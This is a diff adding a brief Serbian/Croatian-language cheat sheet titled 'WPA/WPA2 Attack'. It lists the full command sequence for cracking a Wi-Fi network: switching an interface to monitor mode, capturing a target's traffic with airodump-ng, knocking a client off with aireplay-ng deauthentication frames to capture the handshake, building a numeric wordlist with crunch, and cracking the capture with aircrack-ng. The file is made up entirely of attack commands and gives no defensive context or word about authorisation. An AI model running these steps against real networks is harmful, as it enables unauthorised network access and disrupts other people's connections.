@@ -1,0 +1,23 @@
+WPA/WPA2 Attack
+
+	Monitor mode
+		iwconfig - lista svih wi-fi interfejsa
+		ifconfig {wifi_name} down
+		airmon-ng check kill
+		iwconfig {wifi_name} mode monitor
+		ifconfig {wifi_name} up
+	
+	Hvatanje paketa:
+		airodump-ng {wifi_name}
+		airodump-ng --bssid {koga_napadamo} --channel 6 --write wpa2 {wifi_name}
+
+	Rukovanje i diskonekcija nekog uredjaja
+		aireplay-ng --deauth 5 -a {koga_napadamo} -c {nasa_adresa} {wifi_name}
+
+	Pravljenje Wordliste:
+		crunch 8 8 0123456789 -o (ime vordliste)
+	
+	Otvaranje paketa:
+		aircrack-ng wpa2-02.cap -w tplinkwordlista
+	
+
